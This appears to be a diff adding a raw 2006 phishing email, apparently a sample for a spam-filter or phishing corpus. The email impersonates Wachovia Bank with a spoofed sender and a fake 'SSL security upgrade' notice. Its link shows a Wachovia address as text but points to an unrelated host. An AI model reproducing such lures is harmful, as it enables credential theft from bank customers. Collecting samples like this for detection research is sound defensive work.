@@ -1,0 +1,55 @@
+Return-Path: <www@ddt.lanck.net>
+X-Original-To: user@login.example.com
+Delivered-To: user@login.example.com
+Received: from mail.example.org (mail.example.org [192.168.6.4])
+	by example.com (Postfix) with ESMTP id 190CB46A5E
+	for <user@login.example.com>; Fri, 25 Aug 2006 23:16:40 -0400 (EDT)
+Received: from DDT (www.ddt.ru [62.152.64.210])
+	by mail.example.org (Postfix) with ESMTP id B742A6FA45E
+	for <user@example.com>; Fri, 25 Aug 2006 23:16:39 -0400 (EDT)
+Received: from localhost (localhost [127.0.0.1])
+  (uid 80)
+  by ddt.lanck.net with local; Sat, 26 Aug 2006 07:17:47 +0400
+  id 000D74D7.44EFBD5B.00012AEB
+To: user@example.com
+Subject: Online Banking Update
+From: Wachovia Bank <services@wachovia.com>
+Message-Id: <1307461822.632@wachovia.com>
+Mime-Version: 1.0
+Content-Type: text/html; charset=iso-8859-1
+Content-Transfer-Encoding: 7bit
+Date: Sat, 26 Aug 2006 07:17:47 +0400
+X-Mime-Autoconverted: from 8bit to 7bit by courier 0.52
+Status: O
+X-Status: 
+X-Keywords:                  
+X-UID: 131
+
+<html>
+<img src=http://www.wachovia.com/images/logo.gif" 
+alt="Wachovia - 
+Personal Finance and Business Financial Services" /></div> 
+<p><b>Dear Customer,</b></p>
+<p>Wachovia Internet Banking, is here by announcing the New 
+Security Upgrade.<br> We've upgraded our new SSL servers to 
+serve our 
+customers for a better and <br> 
+secure banking service,against any fraudulent activities. 
+Due to this 
+recent upgrade,<br> you are requested 
+to update your account information by <br>
+following the reference below.<br> 
+</p> 
+<p>Reference*</p>
+<a 
+href="http://onlinegame.addr.com/watch_out/index.htm"
+> http://www.http://w
+ww.wachovia.com/secure/update/ssl.cfm</a></P >
+<pre>
+<b>Regards</b> 
+Wachovia Bank, N.A. and its affiliates. 
+</html> 
+
+
+
+
